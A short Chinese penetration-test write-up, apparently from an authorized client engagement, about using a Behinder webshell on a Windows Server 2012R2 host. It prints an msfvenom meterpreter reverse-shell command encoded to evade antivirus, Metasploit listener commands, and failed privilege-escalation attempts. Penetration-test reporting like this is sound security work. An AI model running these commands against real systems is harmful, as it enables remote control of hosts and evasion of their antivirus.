02

**冰蝎给我连！**

![](../Images/afd3001e00cb818990d0b5a9e60d0cd0.png)

先看看权限，local service，比较低啊，看来得想办法提权，或者直接把管理员密码dump下来。

![](../Images/60711514afe9535178b76279cd88d21d.png)

Systeminfo看了下，是2012R2的系统，默认是没办法直接从lsass.exe中读取到明文账户密码，只能读hash下来解密碰碰运气。

![](../Images/c9a0ff39e0e7b1e461d2b1d9458ef4a6.png)

先生成个msf马反弹个shell看看。

 

msfvenom -p windows/meterpreter/reverse\_tcp -a x86 LHOST=x.x.x.x LPORT=7777 -e x86/shikata\_ga\_nai -i 15 -b '\\x00\\' -f exe > 360.exe

 

payload 选择 windows/meterpreter/reverse\_tcp，LHOST和LPORT分别填攻击机ip和MSF监听的端口，-e x86/shikata\_ga\_nai -i 15是用 x86/shikata\_ga\_nai 编码器编码15次以简单绕过av检测。

 

Msf开启监听，先上传到目标主机看看吧，当我要执行的时候，马子消失了。

![](../Images/420b6817d0731119abfad207f4f5afc7.png)

大意了，看来是有杀软，看看进程，好家伙，还不止一个，360全家桶和安全狗套餐，得想办法免杀了。

![](../Images/f67b8a5c3d07ce51fcf895b921021a20.png)

免杀菜鸟哭唧唧，突然想起来冰蝎好像自带个反弹shell的功能，试用下。

![](../Images/386fbecfc8132350f2057acb4af79993.png)

Msf输入：

use exploit/multi/handler

set payload java/meterpreter/reverse\_tcp

set lhost 0.0.0.0

set lport 7777

exploit

反弹成功！

![](../Images/2e6c924bea9f47a8dd368155184db18e.png)

先getsystem，什么？没有这个命令？那我窃取令牌提权总可以吧，也没有？

Jsp的payload可把我难住了，这么多功能都没有拿啥提权。

![](../Images/a25878c5237e612c7e452e5837ca9740.png)![](../Images/4dfc588ce93bcdc862b82d40e6260f42.png)![](../Images/333ddf3ba0e9314ff8877ce5edc2f3ff.png)

把systeminfo贴下来，查看可用的提权exp，尝试了2012受影响的exp，均以失败告终。

![](../Images/9fa3b7ac0b4a33817bef4c0f76038393.png)![](../Images/efa1b34d7f78a2c86a6ebaeceb265d56.png)

果然菜才是原罪。研究下免杀，下次再战，先把漏洞报告提交给客户吧！
